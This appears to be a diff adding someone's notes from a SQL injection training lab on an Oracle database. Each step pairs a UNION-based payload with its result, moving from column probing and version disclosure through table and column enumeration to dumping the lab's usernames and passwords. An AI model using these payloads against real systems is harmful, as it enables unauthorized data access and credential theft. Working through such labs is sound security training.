@@ -1,0 +1,27 @@
+
+' order by 3-- -> internal server error
+3 - 1 = 2
+
+' UNION select 'a', 'a' from DUAL --
+-> both columns accept type text
+
+' UNION select banner, 'a' from v$version --
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+
+
+' UNION SELECT table_name, NULL FROM all_tables --
+USERS_OWSABQ
+
+' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_OWSABQ'-- 
+
+USERNAME_BIUZKQ
+PASSWORD_XROWJF
+
+' UNION select USERNAME_BIUZKQ, PASSWORD_XROWJF from USERS_OWSABQ--
+
+administrator
+	v0zsau3mtweffs58j9qy
+carlos
+	75wb1jeqxnkmamoyw945
+wiener
+	mjnsj6hgz3qjp0o4o7sk
